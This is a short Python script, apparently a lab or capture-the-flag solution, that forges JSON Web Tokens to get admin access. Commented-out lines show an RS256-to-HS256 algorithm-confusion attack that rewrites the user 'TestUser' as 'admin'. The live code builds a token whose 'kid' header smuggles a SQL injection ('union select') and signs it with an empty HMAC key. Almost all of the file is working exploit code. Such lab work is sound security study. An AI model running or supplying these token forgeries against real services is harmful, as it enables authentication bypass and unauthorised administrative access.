import base64
import hmac
import hashlib

with open('Key.pem', 'r') as file:
    key = file.read()
    
#token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6IlRlc3RVc2VyIn0.eQVNtQhdxJBQMR68G54NYxaihIN29J-aw3G_BY3AKWKfhHEfC22UZWlmWUoAegM8wUglFIhFwSjcYF4iUMGFrkLK9iEW82s8IIGItKjiMUTC4IKYrSR81qD88y1BOOVMPOkaQ3IeMX3sY3RVvDY_9jXifk3KNbXWWcDnmJD1bKSvyjBSkUURPn8yEdHQGQcyIhy4snoMFbU3gfCf8vnWkR5jI-G7AbFBI87Q2ZZw6_eudS8-ddj0clkeBi8K3Xf8XI_yKjw3P8ZvYrA8Mp1xOZVTDNKqRxc31FCQ_qFQwAHzyEFvbu-zFpNRy6mpq8Ynh-LAuu4S2qy_iILo755znQ'
#components = token.split('.')

#components[0] = base64.b64decode(components[0]).decode().replace("RS256","HS256")
#components[1] = base64.b64decode(components[1]+'==').decode().replace("TestUser", "admin")
#components[0] = bytes(base64.b64encode(bytes(components[0], 'utf-8')).decode().replace("=", ""), 'utf-8')
#components[1] = bytes(base64.b64encode(bytes(components[1], 'utf-8')).decode().replace("=",""), 'utf-8')


#print(components[0])
#print(components[1])

strToSign = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Inp6enp6enp6eicgdW5pb24gc2VsZWN0ICdhYWEifQ.eyJ1c2VyIjoiYWRtaW4ifQ"
sig = base64.urlsafe_b64encode(hmac.new(bytes("", 'utf-8'), bytes(strToSign, 'utf-8'), hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

print(strToSign +"."+sig)
